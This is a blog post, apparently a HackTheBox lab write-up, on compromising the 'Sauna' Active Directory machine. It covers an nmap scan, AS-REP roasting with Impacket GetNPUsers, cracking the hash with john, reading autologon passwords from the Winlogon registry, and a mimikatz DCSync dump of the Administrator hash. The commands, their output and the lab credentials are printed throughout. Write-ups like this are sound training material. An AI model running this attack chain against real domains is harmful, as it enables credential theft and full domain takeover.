---
date: 2020-07-18 23:48:05
layout: post
title: HackTheBox Sauna Writeup
subtitle: Hackthebox Sauna Writeup.
description: >-
  in this blog i've explained how to solve Sauna machine in hackthebox
image: https://i.ibb.co/m620KrC/sauna.png
optimized_image: https://i.ibb.co/m620KrC/sauna.png
category: hackthebox
tags:
  - hackthebox
  - Sauna
author: Ahmed Fatouh
paginate: true
---


# []()Methodology

* Nmap-Scan
* Ldap-Enumeration
* Enum-Valid TGT with GetNpUsers from Impacket
* Login as fsmith
* catch autologin credentials from autologon registry
* Privilege Escalation

# []()Nmap-Scan:

> as always, i did nmap scan to find out which servicecs was running in this machine, i found some important ports like **80** for Microsoft IIS and **389** for ldap.

* let's start

> nmap -sS -sC -sV 10.10.10.175 -oN scan.txt 

```ruby

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-03 08:11:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: **EGOTISTICAL-BANK.LOCAL0**., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/3%Time=5E86A997%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4h59m28s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-03T08:14:32
|_  start_date: N/A


```

> let's check the web-page.

# []()Checking-The-Web-Page:

* from the web-page i made a wordlist which contain some usernames, i used this list for bruteforcing the smb credentials but it didn't work, but when i used the Impacket tool --> worked successfully. let's start.

* the web-page.

> ![wep-page](https://i.ibb.co/mBwYHJn/web-page.png)

* very normal page. let's scroll down now.

> ![](https://i.ibb.co/kJFw6tx/about.png)

* I was distracted in this part because I found that the names consist of two parts so we have to know how names are written or stored or how to choose the names in the AD

> i read this blog to know how to choose usernames for my wordlist [ Active Directory user naming conventions ](https://activedirectorypro.com/active-directory-user-naming-convention/)

> the way is very easy like if we have username with 2 part's like **fergus smith** the username of the AD could be f.smith, the first char of the first part and all the seconed part, you got me!.

* let's make wordlist.

* this is a simple wordlist i made it.

```ruby

f.smith
fsmith
s.coins 
scoins
h.bear
hbear
b.taylor
btaylor
s.driver
sdriver
s.kerb
skerb

```

> let's go to **/usr/share/doc/python3-impacket/examples** and use **GetNPUsers.py**

> **python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile /home/xdev05/Documents/HTB/Sauna/wordlist.txt -no-pass**
>
> ![TGT](https://i.ibb.co/VTXrYWQ/TGT.png)

* nice! let's crack this hash with john-the-ribber.

> **sudo john --wordlist=/usr/share/wordlists/rockyou.txt TGT**

```ruby

Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:14 DONE (2020-07-17 23:51) 0.07082g/s 746388p/s 746388c/s 746388C/s Thing..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

* nice! we have user and his password let's login with evil-winrm

> User: **fsmith** , Password: **Thestrokes23**

> Login as **fsmith** and read the **user flag**.
>
> ![user](https://i.ibb.co/bPz0fks/user.gif)

# []()Privilege Escalation

* after some enumeration with winPEAS.exe [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), i foudn credentials for another user.

* let's start. i did it without WinPEAS.exe because i didn't like it.

> command: **reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"**

```ruby

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x303697c4
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey

```

* nice, we have the password for **svc_loanmgr**, let's login again with this credentials.

> Username: **svc_loanmanager**, Password:  **Moneymakestheworldgoround!**
>
> ![](https://i.ibb.co/Sn9b7G4/svc.png)

# []()Privilege Escalation --> Administrator:

> in this part, i used mimikatz to dump the **DCSyncing Hashes** and you can read about it from [here](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)

* let's upload mimikatz to the machine. you can download mimikatz from [here](https://github.com/gentilkiwi/mimikatz/releases)

> command: **.\mimikatz.exe "lsadump::dcsync /user:Administrator"**
>
> ![admin](https://i.ibb.co/C9v7BxB/admin-hash.gif)

* nice!.

# []()Root@Sauna

![admin](https://i.ibb.co/RvJ4x1K/admin.gif)

* cheers!

* Thanks for reading.

 <script src="https://www.hackthebox.eu/badge/103789"></script>
